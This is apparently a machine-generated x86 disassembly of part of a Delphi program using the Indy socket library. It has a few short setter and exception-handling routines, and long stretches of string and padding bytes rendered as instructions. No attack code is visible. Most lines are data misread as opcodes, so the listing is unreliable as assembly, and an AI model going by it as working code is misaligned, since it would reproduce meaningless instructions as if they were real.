mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
inc ecx
push ebx
je r-xdata
inc ecx
push ebx
outsb
jb r-xdata
inc ebx
imul esi [ edx + 0x63 ] 0x72616c75
dec esp
imul ebp [ esi + 0x6b ] 0x1800408d
bound eax [ edi ]
or [ edi ] dl
push esp
dec ecx
dec ecx
outsb
je r-xdata
imul ebp [ edi + 0x6e ] 0x65746e49
add [ eax + 0x50 ] dh
inc esi
add al ah
inc edi
add [ eax + 0x64 ] ch
inc edi
add [ eax + 0x64 ] al
inc edi
add [ esp + 0x64bc0047 ] dl
inc edi
add [ esi ] dl
push esp
dec ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
dec ecx
outsb
je r-xdata
popad
insd
inc ebp
jbe r-xdata
add [ edi ] eax
push esp
dec ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
dec ecx
outsb
je r-xdata
jb r-xdata
adc al 0x62
jo r-xdata
inc edi
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
or [ edi + 0x6e ] ecx
jb r-xdata
loope r-xdata
push 0xe800464f
outsb
add al cl
insd
inc ecx
add ah al
fiadd [ ecx ]
mov eax 0xd4004765
jb r-xdata
add [ eax - 0x53ffbe26 ] ch
outsb
inc ecx
add ah ch
fld [ ecx ]
enter 0x416d 0x0
jb r-xdata
jo r-xdata
shl [ edi + eax - 0x75 ] 0xd6
mov ecx [ eax ]
call [ ecx + 0x34 ]
pop esi
pop ebx
retn
pop eax
bound eax [ edi ]
pop eax
add [ eax + 0x4f0c0004 ] al
outsb
inc esp
imul esi [ ebx + 0x63 ] 0x656e6e6f
arpl [ eax + ebx * 2 + 0x62 ] si
inc edi
add [ eax ] al
cld
bound eax [ edi ]
cld
dec edi
inc esi
add [ edi ] al
add [ ebx ] cl
dec ecx
dec ecx
outsb
je r-xdata
jo r-xdata
add cl [ eax ]
pop es
add [ eax + 0x63 ] bl
inc edi
add al dl
aaa
push esp
inc edx
jns r-xdata
jo r-xdata
inc edx
jne r-xdata
dec esi
outsd
je r-xdata
cmp [ ebx + 0x4a ] 0x0
je r-xdata
mov edx [ eax ]
call [ edx + 0x38 ]
jb r-xdata
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx + 0x62 ] si
dec edi
nop
pop esp
arpl [ edi ] ax
loop r-xdata
jae r-xdata
fiadd [ ecx ]
int3
add [ eax - 0x2bffb89b ] bh
arpl [ ebp + 0x70 ] sp
je r-xdata
jns r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
jo r-xdata
jb r-xdata
pop es
push ss
push esp
dec ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
dec ecx
outsb
je r-xdata
add ah ah
fiadd [ ecx ]
inc esi
add ah bh
bound eax [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
arpl [ edi ] ax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
arpl [ edi ] ax
shl [ edi ] 0x1
inc ecx
pop es
je r-xdata
outsb
jbe r-xdata
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
push edx
add eax 0x47635800
add [ eax + eax ] dh
add bh bh
in al 0x64
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49090002 ] al
outsb
je r-xdata
outsb
je r-xdata
arpl [ gs : ebp + 0x69 ] sp
jbe r-xdata
add [ eax ] al
add [ 0x6e4f0900 ] 0x52
jb r-xdata
add [ eax ] ecx
pop es
inc ecx
push ebx
outsb
jb r-xdata
jo r-xdata
add [ eax + 0x63 ] bl
inc edi
add [ edx + 0x47 ] bl
add [ eax ] cl
pop ss
push esp
dec ecx
dec ecx
outsb
je r-xdata
push esp
dec ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
dec ecx
outsb
je r-xdata
add [ eax ] al
[ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ esi ] al
dec edi
outsb
push ebx
outsb
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
outsb
adc al 0x62
inc edi
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090003 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x47 ] bl
add [ eax ] al
add [ eax ] al
jb r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x63 ] al
inc edi
add [ eax ] ah
add [ eax ] al
sub_476468
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x30 ] esi
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_476494
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
cmp [ ebx + 0x52 ] 0x0
je r-xdata
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_4764bc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_4764e4
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x114 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4765aa
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0x34 ] eax
test eax eax
je r-xdata
cmp esi ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4765b1
lea eax [ ebp - 0x114 ]
call sub_404e44
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
mov edx esi
call sub_41db30
mov ebx [ ebx + 0x34 ]
test ebx ebx
jne r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x110 ]
mov eax [ esi ]
call sub_403e44
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_406fd4
mov edx [ ebp - 0x114 ]
mov eax [ r-xdata ]
pop ecx
call sub_4624e8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
sub_4765b8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41dd8c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x34 ]
jne r-xdata
xor eax eax
mov [ edi + 0x34 ] eax
sub_476658
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
inc di
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
je r-xdata
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
cmovne ecx [ ecx + 0x64 ]
inc ebx
insb
outsd
jae r-xdata
pushad
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x47 ] ah
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
push ds
inc ebp
dec ecx
push edx
popad
dec esp
outsb
dec ebp
popad
js r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] al
inc edi
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
push cs
inc ebp
dec ecx
push edx
popad
push esp
imul ebp [ ebp + 0x65 ] 0x9074756f
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
cmovne ecx [ ecx + 0x64 ]
push eax
outsd
jb r-xdata
imul ebp [ esi + 0x65 ] 0x676e654c
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
push 0xc0047
push edx
jno r-xdata
xor [ fs : eax + 0x47 ] ch
inc ebp
js r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x69 ] ch
inc edi
add [ eax + eax ] cl
add [ eax ] al
inc esp
push 0x41ac0047
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
outsd
jb r-xdata
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
adc eax 0x54644945
inc ebx
push eax
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 2 + 0xc0047 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 2 ] dh
inc edi
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
cmovne ecx [ ecx + 0x64 ]
dec eax
imul esi [ edx + 0x65 ] 0x47683064
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
push edx
jno r-xdata
jb r-xdata
nop
shl [ edi + 0x47 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
inc edi
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
cmovne ecx [ ecx + 0x64 ]
dec esi
outsd
inc esp
popad
je r-xdata
jb r-xdata
outsd
jae r-xdata
dec ecx
dec eax
push 0xc0047
add [ eax ] al
inc esp
push 0x41ac0047
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
sbb [ ebp + 0x49 ] eax
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edx * 2 + 0x79 ] si
jo r-xdata
sar al 0x68
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
outsb
insb
jb r-xdata
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
imul esi [ edx + 0x65 ] 0x47689064
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
outsd
jne r-xdata
push esp
outsd
push edx
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
push 0x47
add [ eax + eax ] cl
add [ eax ] al
inc esp
push 0x41ac0047
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
cmovne ecx [ ecx + 0x64 ]
inc esi
imul ebp [ ebp + 0x4e ] 0x6f46746f
jo r-xdata
add ah bl
xor [ esi ] eax
pop ss
inc ebp
dec ecx
dec ecx
dec edi
dec eax
aas
inc eax
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
push 0x47
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
mov [ fs : edx + 0x47 ] gs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00476a ] dl
add [ eax ] al
add [ ebp + ebp + 0x46 ] ch
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
cmovne ecx [ ecx + 0x64 ]
dec esi
outsd
je r-xdata
add [ eax ] bl
aas
outsb
jbe r-xdata
int3
jo r-xdata
insd
outsd
je r-xdata
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
sbb [ ebp + 0x49 ] al
push ebx
push ebx
dec esp
push eax
jb r-xdata
outsd
outsb
outsb
arpl [ gs : ebp + 0x64 ] si
in al dx
push 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x6a
inc edi
add [ eax ] al
add [ eax ] al
popad
insb
imul esp [ esp + ecx * 8 + 0x69 ] 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr [ ecx + 0x47 ] 0x1
add [ eax + eax ] cl
add [ eax ] al
inc esp
push 0x41ac0047
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
imul eax [ edi ] 0x0
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x6c
inc edi
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
sbb eax [ ebp + 0x49 ]
push esp
jb r-xdata
mov eax eax
mov esp 0x476b
add [ eax ] al
jne r-xdata
outsd
arpl [ edi + 0x6c ] bp
push edx
jo r-xdata
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
mov eax eax
imul eax [ fs : edi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0xc004769
add [ eax ] al
add [ eax + ebp * 2 + 0x47 ] al
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
fdiv [ ecx ]
inc esi
add [ 0x53644945 ] cl
outsb
jae r-xdata
je r-xdata
outsd
outsb
and [ edi + eax * 2 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar [ ebx + ebp * 2 + 0x47 ] 0x0
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
insd
outsd
jb r-xdata
mov eax eax
in al dx
insb
popad
jb r-xdata
outsd
add ah bh
inc eax
add [ eax ] bl
aas
imul ebp [ esi + 0x64 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
insb
inc edi
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
inc eax
add ah bh
inc eax
jb r-xdata
popad
imul ebp [ ebp + 0x64 ] 0x476e2c90
jae r-xdata
popad
inc edi
add [ eax ] al
shr ah 0x6c
shr [ fs : ebp + 0x47 ] 0x0
jae r-xdata
arpl [ ebx + 0x73 ] bp
inc ebp
jb r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
imul eax [ edi ] 0xc
add [ eax ] al
add [ ebp + ebp + 0x46 ] ch
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
adc eax [ ebp + 0x49 ]
inc ebx
outsd
outsb
outsb
arpl [ gs : ebp + eax * 2 + 0x78 ] si
arpl [ ebp + 0x70 ] sp
je r-xdata
outsd
jb r-xdata
outsd
inc edi
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
outsb
inc edi
add [ eax + eax ] cl
add [ eax ] al
inc eax
insb
inc edi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
insb
nop
sub al 0x6e
push ebx
jb r-xdata
inc eax
add [ esi + ebp * 2 + 0x47 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
outsb
inc edi
add [ eax + eax ] cl
add [ eax ] al
inc eax
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les ebp [ ebp + 0x47 ]
add [ eax + eax ] cl
add [ eax ] al
inc eax
insb
inc edi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
shr [ ebp + 0x47 ] 0x0
inc edi
add [ eax + eax ] cl
add [ eax ] al
inc eax
insb
inc edi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
sbb eax [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
inc esi
popad
imul ebp [ ebp + 0x64 ] 0x6d54c08b
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6d ] bl
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
or eax 0x53644945
sbb [ edi ] bh
jb r-xdata
inc ebx
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
adc [ ebp + 0x49 ] eax
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 + 0x69 ] si
inc eax
add [ eax + 0x6b ] bl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 2 + 0x47 ] bl
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x6874654d
outsd
inc ebp
jb r-xdata
je r-xdata
inc edi
jb r-xdata
jb r-xdata
jb r-xdata
inc edi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
sbb al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
xchg esp eax
outsb
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00476e ] bl
add [ eax ] al
add [ eax + 0x6c ] al
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
outsd
outsb
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr [ edi + 0x47 ] 0x1
outsd
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
adc al 0x45
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebp
outsb
imul ebp [ esi + 0x6f ] 0x77
outsb
inc ebp
jb r-xdata
inc eax
add ah bh
outsb
je r-xdata
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
sbb al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
inc eax
popad
imul ebp [ ebp + 0x64 ] r-xdata
add [ eax + eax ] cl
add [ eax ] al
inc eax
insb
inc edi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
sbb al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
outsd
inc edi
outsd
inc edi
add [ eax ] al
add [ eax ] al
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
pop ss
inc ebp
dec ecx
push ebx
outsd
jae r-xdata
inc eax
cld
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
insb
inc edi
add [ eax + eax ] cl
add [ eax ] al
inc eax
insb
inc edi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
adc eax 0x53644945
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
inc ebx
popad
outsb
jb r-xdata
outsd
jb r-xdata
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
sbb eax 0x53644945
outsd
arpl [ ebx + 0x73 ] bp
push ebx
outsb
jb r-xdata
cmp [ eax + 0x47 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
